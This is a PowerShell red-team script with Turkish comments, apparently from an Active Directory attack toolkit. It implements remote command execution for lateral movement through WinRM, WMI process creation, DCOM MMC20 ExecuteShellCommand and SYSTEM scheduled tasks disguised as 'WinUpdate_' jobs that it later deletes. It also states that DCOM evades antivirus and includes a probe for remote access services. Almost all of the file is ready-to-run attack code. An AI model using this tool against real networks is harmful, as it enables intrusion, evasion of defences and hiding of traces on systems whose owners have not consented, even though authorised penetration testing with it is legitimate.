<#
.SYNOPSIS
    PsExec yerine PowerShell native lateral movement araçları.

.DESCRIPTION
    Exe çalıştırma kısıtlaması olan ortamlarda lateral movement için
    PowerShell native yöntemler sunar. 4 farklı yöntem desteklenir:

    1. WinRM (PowerShell Remoting) - En yaygın ve güvenilir
    2. WMI (Windows Management Instrumentation) - Eski ama etkili
    3. DCOM (Distributed COM) - Alternatif RPC tabanlı
    4. Scheduled Task - Zamanlanmış görev ile komut çalıştırma

    Her yöntemin avantaj ve dezavantajları:

    | Yöntem | Port | Avantaj | Dezavantaj |
    |--------|------|---------|------------|
    | WinRM  | 5985/5986 | En güvenilir, tam PS session | WinRM aktif olmalı |
    | WMI    | 135 + dynamic | Çoğu ortamda açık | Çıktı almak zor |
    | DCOM   | 135 + dynamic | AV'den kaçar | Karmaşık |
    | Task   | 445 (SMB) | Her yerde çalışır | Yavaş, iz bırakır |

.PARAMETER Target
    Hedef makine adı veya IP adresi.

.PARAMETER Command
    Çalıştırılacak komut.

.PARAMETER Method
    Kullanılacak lateral movement yöntemi.
    Varsayılan: WinRM

.PARAMETER Credential
    Opsiyonel PSCredential nesnesi. Belirtilmezse mevcut oturum kullanılır.

.PARAMETER Username
    Opsiyonel. Credential oluşturmak için kullanıcı adı.

.PARAMETER Password
    Opsiyonel. Credential oluşturmak için parola.

.PARAMETER ScriptBlock
    WinRM modunda çalıştırılacak ScriptBlock (Command yerine).

.PARAMETER Interactive
    WinRM modunda interaktif session açar (Enter-PSSession).

.EXAMPLE
    # WinRM ile komut çalıştır
    Invoke-LateralMovement -Target SERVER01 -Command "whoami /all"

.EXAMPLE
    # WMI ile komut çalıştır
    Invoke-LateralMovement -Target SERVER01 -Command "ipconfig /all" -Method WMI

.EXAMPLE
    # Scheduled Task ile
    Invoke-LateralMovement -Target SERVER01 -Command "net user" -Method Task

.EXAMPLE
    # DCOM ile
    Invoke-LateralMovement -Target SERVER01 -Command "hostname" -Method DCOM

.EXAMPLE
    # Kimlik bilgileri ile
    Invoke-LateralMovement -Target SERVER01 -Command "whoami" -Username "DOMAIN\admin" -Password "P@ssw0rd"

.EXAMPLE
    # İnteraktif session
    Invoke-LateralMovement -Target SERVER01 -Interactive

.EXAMPLE
    # ScriptBlock ile
    Invoke-LateralMovement -Target SERVER01 -ScriptBlock { Get-Process | Sort-Object CPU -Descending | Select -First 10 }

.EXAMPLE
    # Birden fazla makineye
    @("SERVER01", "SERVER02", "SERVER03") | ForEach-Object {
        Invoke-LateralMovement -Target $_ -Command "hostname"
    }

.NOTES
    PsExec.exe yerine PowerShell native alternatif
    AD Red Team PowerShell Toolkit
#>

function Invoke-LateralMovement {
    [CmdletBinding(DefaultParameterSetName = 'Command')]
    param(
        [Parameter(Mandatory = $true, Position = 0)]
        [string]$Target,

        [Parameter(ParameterSetName = 'Command', Mandatory = $false, Position = 1)]
        [string]$Command,

        [Parameter(Mandatory = $false)]
        [ValidateSet("WinRM", "WMI", "DCOM", "Task")]
        [string]$Method = "WinRM",

        [Parameter(Mandatory = $false)]
        [System.Management.Automation.PSCredential]$Credential,

        [Parameter(Mandatory = $false)]
        [string]$Username,

        [Parameter(Mandatory = $false)]
        [string]$Password,

        [Parameter(ParameterSetName = 'ScriptBlock', Mandatory = $false)]
        [scriptblock]$ScriptBlock,

        [Parameter(ParameterSetName = 'Interactive')]
        [switch]$Interactive
    )

    # Credential oluştur
    if ($Username -and $Password -and -not $Credential) {
        $secPass = ConvertTo-SecureString $Password -AsPlainText -Force
        $Credential = New-Object System.Management.Automation.PSCredential($Username, $secPass)
    }

    Write-Host "[*] Lateral Movement - Yöntem: $Method" -ForegroundColor Cyan
    Write-Host "[*] Hedef: $Target" -ForegroundColor Cyan
    if ($Credential) {
        Write-Host "[*] Kullanıcı: $($Credential.UserName)" -ForegroundColor Cyan
    } else {
        Write-Host "[*] Mevcut oturum kimlik bilgileri kullanılıyor" -ForegroundColor Cyan
    }
    Write-Host ("-" * 60) -ForegroundColor DarkGray

    switch ($Method) {

        "WinRM" {
            if ($Interactive) {
                Write-Host "[*] İnteraktif PS session açılıyor..." -ForegroundColor Yellow
                try {
                    if ($Credential) {
                        Enter-PSSession -ComputerName $Target -Credential $Credential
                    } else {
                        Enter-PSSession -ComputerName $Target
                    }
                }
                catch {
                    Write-Error "[!] WinRM bağlantısı başarısız: $($_.Exception.Message)"
                    Write-Host "[*] WinRM aktif mi kontrol edin: Test-WSMan -ComputerName $Target" -ForegroundColor Yellow
                }
                return
            }

            Write-Host "[*] WinRM (Invoke-Command) kullanılıyor..." -ForegroundColor Yellow
            try {
                $params = @{
                    ComputerName = $Target
                    ErrorAction  = "Stop"
                }
                if ($Credential) { $params.Credential = $Credential }

                if ($ScriptBlock) {
                    $params.ScriptBlock = $ScriptBlock
                }
                else {
                    $params.ScriptBlock = [scriptblock]::Create($Command)
                }

                $result = Invoke-Command @params
                Write-Host "[+] Çıktı:" -ForegroundColor Green
                $result
            }
            catch {
                Write-Error "[!] WinRM hatası: $($_.Exception.Message)"
                Write-Host ""
                Write-Host "[*] Troubleshooting:" -ForegroundColor Yellow
                Write-Host "    - WinRM aktif mi? → Test-WSMan -ComputerName $Target" -ForegroundColor White
                Write-Host "    - Firewall 5985/5986 açık mı?" -ForegroundColor White
                Write-Host "    - TrustedHosts ayarlı mı? → Set-Item WSMan:\localhost\Client\TrustedHosts -Value '$Target'" -ForegroundColor White
            }
        }

        "WMI" {
            Write-Host "[*] WMI (Invoke-WmiMethod) kullanılıyor..." -ForegroundColor Yellow
            try {
                $params = @{
                    ComputerName = $Target
                    Class        = "Win32_Process"
                    Name         = "Create"
                    ArgumentList = $Command
                    ErrorAction  = "Stop"
                }
                if ($Credential) { $params.Credential = $Credential }

                $result = Invoke-WmiMethod @params

                if ($result.ReturnValue -eq 0) {
                    Write-Host "[+] Komut başarıyla çalıştırıldı! PID: $($result.ProcessId)" -ForegroundColor Green
                    Write-Host "[*] Not: WMI ile doğrudan çıktı alınamaz." -ForegroundColor Yellow
                    Write-Host "[*] Çıktı almak için komutu bir dosyaya yönlendirin:" -ForegroundColor Yellow
                    Write-Host "    Invoke-LateralMovement -Target $Target -Command 'cmd /c $Command > C:\Users\Public\output.txt' -Method WMI" -ForegroundColor White
                    Write-Host "    type \\$Target\C$\Users\Public\output.txt" -ForegroundColor White
                }
                else {
                    Write-Error "[!] Komut başarısız. Return value: $($result.ReturnValue)"
                }
            }
            catch {
                Write-Error "[!] WMI hatası: $($_.Exception.Message)"
                Write-Host "[*] CIM alternatifi denenebilir: Invoke-CimMethod" -ForegroundColor Yellow
            }
        }

        "DCOM" {
            Write-Host "[*] DCOM (MMC20.Application) kullanılıyor..." -ForegroundColor Yellow
            try {
                # MMC20.Application COM nesnesi ile
                $comType = [Type]::GetTypeFromProgID("MMC20.Application", $Target)
                $comObj = [Activator]::CreateInstance($comType)

                Write-Host "[+] DCOM bağlantısı kuruldu." -ForegroundColor Green
                Write-Host "[*] ExecuteShellCommand çağrılıyor..." -ForegroundColor Yellow

                # Komutu çalıştır
                $comObj.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c $Command", "7")

                Write-Host "[+] Komut gönderildi!" -ForegroundColor Green
                Write-Host "[*] Not: DCOM ile doğrudan çıktı alınamaz." -ForegroundColor Yellow

                # Temizle
                [System.Runtime.InteropServices.Marshal]::ReleaseComObject($comObj) | Out-Null
            }
            catch {
                Write-Error "[!] DCOM hatası: $($_.Exception.Message)"
                Write-Host ""
                Write-Host "[*] Alternatif DCOM nesneleri:" -ForegroundColor Yellow
                Write-Host "    - ShellWindows: [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39', '$Target')" -ForegroundColor White
                Write-Host "    - ShellBrowserWindow: [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880', '$Target')" -ForegroundColor White
            }
        }

        "Task" {
            Write-Host "[*] Scheduled Task kullanılıyor..." -ForegroundColor Yellow
            $taskName = "WinUpdate_" + (Get-Random -Maximum 9999)
            $outputFile = "C:\Users\Public\$taskName.txt"

            try {
                # Zamanlanmış görev oluştur
                $cmdToRun = "cmd.exe /c `"$Command > $outputFile 2>&1`""

                if ($Credential) {
                    schtasks /create /s $Target /u $Credential.UserName /p $Credential.GetNetworkCredential().Password /tn $taskName /tr $cmdToRun /sc once /st 00:00 /f /ru "SYSTEM" 2>&1 | Out-Null
                    schtasks /run /s $Target /u $Credential.UserName /p $Credential.GetNetworkCredential().Password /tn $taskName 2>&1 | Out-Null
                }
                else {
                    schtasks /create /s $Target /tn $taskName /tr $cmdToRun /sc once /st 00:00 /f /ru "SYSTEM" 2>&1 | Out-Null
                    schtasks /run /s $Target /tn $taskName 2>&1 | Out-Null
                }

                Write-Host "[+] Task oluşturuldu ve çalıştırıldı: $taskName" -ForegroundColor Green

                # Çıktıyı bekle
                Start-Sleep -Seconds 3

                # Çıktıyı oku
                try {
                    $output = Get-Content "\\$Target\C$\Users\Public\$taskName.txt" -ErrorAction Stop
                    Write-Host "[+] Çıktı:" -ForegroundColor Green
                    $output
                }
                catch {
                    Write-Host "[*] Çıktı dosyası henüz hazır değil. Manuel kontrol:" -ForegroundColor Yellow
                    Write-Host "    type \\$Target\C$\Users\Public\$taskName.txt" -ForegroundColor White
                }

                # Temizle
                if ($Credential) {
                    schtasks /delete /s $Target /u $Credential.UserName /p $Credential.GetNetworkCredential().Password /tn $taskName /f 2>&1 | Out-Null
                }
                else {
                    schtasks /delete /s $Target /tn $taskName /f 2>&1 | Out-Null
                }

                # Çıktı dosyasını sil
                Remove-Item "\\$Target\C$\Users\Public\$taskName.txt" -Force -ErrorAction SilentlyContinue

                Write-Host "[+] Task ve çıktı dosyası temizlendi." -ForegroundColor Green
            }
            catch {
                Write-Error "[!] Scheduled Task hatası: $($_.Exception.Message)"
                # Temizlik
                schtasks /delete /s $Target /tn $taskName /f 2>&1 | Out-Null
            }
        }
    }

    Write-Host ("-" * 60) -ForegroundColor DarkGray
}

# Ek yardımcı: Tüm yöntemleri dene
function Test-LateralMovementMethods {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Target
    )

    Write-Host "[*] Lateral movement yöntemleri test ediliyor: $Target" -ForegroundColor Cyan
    Write-Host ""

    # WinRM
    Write-Host "[*] WinRM testi..." -ForegroundColor Yellow
    try {
        $wsmanResult = Test-WSMan -ComputerName $Target -ErrorAction Stop
        Write-Host "    [+] WinRM: AKTIF" -ForegroundColor Green
    }
    catch {
        Write-Host "    [-] WinRM: KAPALI" -ForegroundColor Red
    }

    # WMI
    Write-Host "[*] WMI testi..." -ForegroundColor Yellow
    try {
        Get-WmiObject -Class Win32_OperatingSystem -ComputerName $Target -ErrorAction Stop | Out-Null
        Write-Host "    [+] WMI: ERİŞİLEBİLİR" -ForegroundColor Green
    }
    catch {
        Write-Host "    [-] WMI: ERİŞİLEMEZ" -ForegroundColor Red
    }

    # SMB
    Write-Host "[*] SMB testi..." -ForegroundColor Yellow
    try {
        $smbTest = Test-Path "\\$Target\C$" -ErrorAction Stop
        if ($smbTest) {
            Write-Host "    [+] SMB (Admin$): ERİŞİLEBİLİR" -ForegroundColor Green
        }
        else {
            Write-Host "    [-] SMB (Admin$): ERİŞİLEMEZ" -ForegroundColor Red
        }
    }
    catch {
        Write-Host "    [-] SMB: ERİŞİLEMEZ" -ForegroundColor Red
    }

    # RDP
    Write-Host "[*] RDP testi..." -ForegroundColor Yellow
    try {
        $tcp = New-Object System.Net.Sockets.TcpClient
        $tcp.Connect($Target, 3389)
        Write-Host "    [+] RDP (3389): AÇIK" -ForegroundColor Green
        $tcp.Close()
    }
    catch {
        Write-Host "    [-] RDP (3389): KAPALI" -ForegroundColor Red
    }
}

if ($MyInvocation.InvocationName -ne '.') {
    if ($args.Count -ge 2) {
        Invoke-LateralMovement -Target $args[0] -Command ($args[1..($args.Count-1)] -join ' ')
    }
}
